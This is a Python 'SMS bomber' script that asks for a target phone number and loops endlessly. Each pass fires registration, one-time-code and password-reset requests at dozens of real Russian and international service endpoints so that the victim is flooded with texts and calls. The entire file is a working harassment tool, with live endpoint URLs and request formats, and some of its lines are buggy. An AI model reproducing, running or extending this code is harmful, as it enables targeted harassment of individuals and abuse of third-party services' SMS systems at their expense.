import requests, random, datetime, sys, time, argparse, os
from colorama import Fore, Back, Style
import datetime
banner = """
 ____________________________________________________
|                                                    |
| [--] Имя: InTimeMod - SmsBomber                    |
|                                                    |
| [--] Сервисы: 51                                   |
|                                                    |
| [--] Modification creator: MaxStewart              |
|                                                    |
|____________________________________________________|
"""
print(banner)
count = 0
count_call = 0
services = ["Grab", "RuTaxi", "BelkaCar", "Tinder", "Carusel", "Tinkoff", "MTS", "Youla", "PizzaHut", "Rabota", "Rutube", "Citilink", "Smsint", "oyorooms", "Mvideo", "newtext", "Sunlight", "alpari", "Invitro", "Sberbank", "Psbank", "Beltelcom", "KFC", "carsmile", "Delitime", "findclone", "Guru", "ICQ", "Indriver", "Pmsm", "IVI", "Lenta", "Mail.ru", "OK", "plink", "qlean", "SMSgorod", "Twitch", "CabWiFi", "wowworks", "Eda.yandex", "SMS", "Delivery"]
_phone = input('Номер для атаки (79xxxxxxxxx)-->> ')

if _phone[0] == '+':
	_phone = _phone[1:]
if _phone[0] == '8':
	_phone = '7'+_phone[1:]
if _phone[0] == '9':
	_phone = '7'+_phone

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

iteration = 0
while True:
	now = datetime.datetime.now()
	time = now.strftime("%H:%M:%S")
	text_error = "[TIME:{}] Не отправлено"
	text = "[TIME:{}] [COUNT:{}] {} отправлено!"
	text_call = "[TIME:{}] [COUNT:{}] {} звонок отправлен!"
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[0]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[1]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[2]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[3]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))
	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[4]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[5]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[6]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[7]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[8]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[9]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[10]))
	except:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[11]))

	try:
		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[12]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[13]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[14]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[15]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[16]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[17]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[18]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[19]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[20]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[21]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[4]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[22]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[23]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[11]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[24]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		count_call += 1
		print(text_call.format(time, count_call, services[25]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text.error.format(time))

	try:
		requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[26]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[27]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[28]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[18]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[29]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[30]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[31]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[32]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[14]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[33]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://plink.tech/register/',json={"phone": _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[34]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[35]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[36]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[37]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[38]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[39]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[40]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[7]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[17]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[41]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))

	try:
		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		count += 1
		print(text.format(time, count, services[42]))
	except:
		now = datetime.datetime.now()
		time = now.strftime("%H:%M:%S")
		print(text_error.format(time))



	try:
		iteration += 1
		print(('{} круг пройден.').format(iteration))
	except:
		break
